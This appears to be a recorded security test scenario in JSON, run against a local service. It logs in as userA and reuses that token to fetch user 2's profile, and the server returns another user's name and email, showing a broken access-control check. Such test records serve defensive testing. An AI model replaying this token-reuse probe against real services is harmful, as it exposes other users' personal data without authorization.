{
  "name": "jwt-reuse-exfil",
  "steps": [
    {
      "id": "login_userA",
      "status_code": 200,
      "request": {
        "url": "http://127.0.0.1:9000/login",
        "method": "POST",
        "body": {
          "username": "userA",
          "password": "Password123"
        },
        "headers": {}
      },
      "response": {
        "token": "abc123"
      },
      "ok": true
    },
    {
      "id": "get_userB_profile",
      "status_code": 200,
      "request": {
        "url": "http://127.0.0.1:9000/users/2/profile",
        "method": "GET",
        "body": null,
        "headers": {
          "Authorization": "Bearer abc123"
        }
      },
      "response": {
        "id": 2,
        "name": "Alice Example",
        "email": "alice@example.com"
      },
      "ok": true
    }
  ],
  "context": {
    "token": "abc123"
  }
}